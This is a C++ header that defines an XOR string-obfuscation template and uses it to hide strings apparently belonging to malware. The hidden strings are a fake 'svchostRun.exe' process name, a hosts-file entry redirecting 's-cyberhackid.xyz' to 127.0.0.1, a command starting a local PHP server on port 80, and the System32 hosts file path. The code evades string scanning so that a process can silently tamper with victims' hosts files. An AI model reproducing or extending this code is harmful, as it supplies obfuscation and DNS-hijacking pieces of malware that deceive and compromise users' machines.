#pragma once
template <int XORSTART, int BUFLEN, int XREFKILLER>

class XorStr
{
private:
	XorStr();
public:
	char s[BUFLEN];

	XorStr(const char * xs);

	~XorStr()
	{
		for (int i = 0; i < BUFLEN; i++)
			s[i] = 0;
	}
};

template <int XORSTART, int BUFLEN, int XREFKILLER>
XorStr<XORSTART, BUFLEN, XREFKILLER>::XorStr(const char * xs)
{
	int xvalue = XORSTART;
	int i = 0;

	for (; i < (BUFLEN - 1); i++)
	{
		s[i] = xs[i - XREFKILLER] ^ xvalue;
		xvalue += 1;
		xvalue %= 256;
	}
	s[BUFLEN - 1] = 0;
}

#define eSvcHostRun /*svchostRun.exe*/XorStr<0xBA,15,0x881E9950>("\xC9\xCD\xDF\xD5\xD1\xCC\xB4\x93\xB7\xAD\xEA\xA0\xBE\xA2"+0x881E9950).s
#define eWriteLocal /*127.0.0.1  s-cyberhackid.xyz*/XorStr<0xAC,29,0x75F138A4>("\x9D\x9F\x99\x81\x80\x9F\x82\x9D\x85\x95\x96\xC4\x95\xDA\xC3\xD9\xD9\xCF\xD6\xDE\xA3\xAA\xAB\xA7\xEA\xBD\xBF\xBD"+0x75F138A4).s
#define eRunPhp /*php\\php.exe -S 127.0.0.1:80 php\\php.php*/XorStr<0xB5,40,0xCEE502B5>("\xC5\xDE\xC7\xE4\xC9\xD2\xCB\x92\xD8\xC6\xDA\xE0\xEC\x91\xE3\xF5\xF7\xF1\xE9\xF8\xE7\xFA\xE5\xFD\xF7\xF6\xFF\xF0\xA1\xBA\xA3\x88\xA5\xBE\xA7\xF6\xA9\xB2\xAB"+0xCEE502B5).s
#define ePhp /*php.exe*/XorStr<0x45,8,0xC49CC64D>("\x35\x2E\x37\x66\x2C\x32\x2E"+0xC49CC64D).s
#define eCopyString /*%s\\System32\\drivers\\etc\\hosts*/XorStr<0x49,30,0x31AA2125>("\x6C\x39\x17\x1F\x34\x3D\x3B\x35\x3C\x61\x61\x08\x31\x24\x3E\x2E\x3C\x28\x28\x00\x38\x2A\x3C\x3C\x09\x0D\x10\x10\x16"+0x31AA2125).s